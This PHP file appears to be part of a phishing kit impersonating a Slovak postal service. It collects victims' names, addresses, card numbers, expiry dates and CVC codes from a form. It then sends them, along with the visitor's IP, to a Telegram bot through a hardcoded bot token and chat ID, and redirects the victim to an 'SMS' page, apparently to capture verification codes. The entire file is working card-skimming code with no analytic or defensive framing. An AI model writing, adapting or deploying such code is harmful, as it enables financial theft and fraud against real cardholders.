<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = " ---[ Post.sk_CVV ]--- \n";
$message .= " + IP   : $ip \n";
$message .= " + Celé : ".$_POST['Celé']."\n";
$message .= " + adresu: ".$_POST['úplnou']."\n";
$message .= " + Poštovní : ".$_POST['Poštovní']."\n";
$message .= " + CC : ".$_POST['ccnumber']."\n";
$message .= " + Fecha : ".$_POST['ccmonth']." / ".$_POST['ccyear']." - " .$_POST['cccvc']. " \n\n";
$message .= "-------------- IP Infos ------------\n";
$token = "5351808312:AAGmAZu-SQtzFG98etOdtDAp4YlNPrauaJ8";
$data = [
    'text' => $message,
    'chat_id' => '-846825914'
];

file_get_contents("https://api.telegram.org/bot5367411588:AAGqu6MHQKUUGDiIJiCmedTB8MmXjrWmsaw/sendMessage?" . http_build_query($data) );




header("Location: ././SMS/");?>
